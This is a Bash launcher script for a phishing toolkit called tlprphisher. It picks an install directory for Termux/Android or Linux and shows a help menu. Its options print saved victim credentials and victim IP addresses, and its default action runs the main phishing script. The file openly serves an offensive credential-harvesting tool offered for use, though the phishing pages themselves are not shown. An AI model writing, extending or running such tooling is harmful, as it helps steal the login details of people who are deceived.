#!/bin/bash

# https://github.com/sajadtlpr/tlprphisher

if [[ $(uname -o) == *'Android'* ]];then
	tlprphisher_ROOT="/data/data/com.termux/files/usr/opt/tlprphisher"
else
	export tlprphisher_ROOT="/opt/tlprphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run tlprphisher type \`tlprphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $tlprphisher_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $tlprphisher_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $tlprphisher_ROOT
	bash ./tlprphisher.sh
fi
